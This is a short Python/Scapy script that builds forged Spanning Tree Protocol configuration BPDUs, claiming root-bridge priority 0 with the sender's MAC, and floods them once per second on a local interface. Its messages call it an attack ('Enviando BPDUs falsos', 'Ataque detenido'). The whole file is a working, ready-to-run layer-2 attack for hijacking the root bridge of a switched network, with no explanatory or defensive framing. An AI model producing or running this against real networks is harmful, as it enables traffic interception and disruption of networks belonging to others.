#!/usr/bin/env python3

from scapy.all import *
import time
import sys

INTERFACE = "eth0"
MY_MAC = "00:0c:29:30:5f:25"

DST_MAC = "01:80:c2:00:00:00"

class STPConf(Packet):
    name = "STP Configuration BPDU"
    fields_desc = [
        ShortField("proto_id", 0x0000),
        ByteField("version", 0x00),
        ByteField("bpdu_type", 0x00),
        ByteField("flags", 0x00),

        ShortField("root_prio", 0x0000),
        MACField("root_mac", MY_MAC),
        IntField("root_path_cost", 0),

        ShortField("bridge_prio", 0x0000),
        MACField("bridge_mac", MY_MAC),

        ShortField("port_id", 0x8001),

        ShortField("message_age", 0x0100),
        ShortField("max_age", 0x1400),
        ShortField("hello_time", 0x0200),
        ShortField("forward_delay", 0x0f00)
    ]

def attack():
    print(f"[*] Enviando BPDUs falsos por {INTERFACE}")

    pkt = Dot3(src=MY_MAC, dst=DST_MAC) / \
          LLC(dsap=0x42, ssap=0x42, ctrl=3) / \
          STPConf() / \
          Raw(load=b"\x00" * 20)

    try:
        while True:
            sendp(pkt, iface=INTERFACE, verbose=0)
            sys.stdout.write(".")
            sys.stdout.flush()
            time.sleep(1)

    except KeyboardInterrupt:
        print("\n[!] Ataque detenido")

if __name__ == "__main__":
    attack()
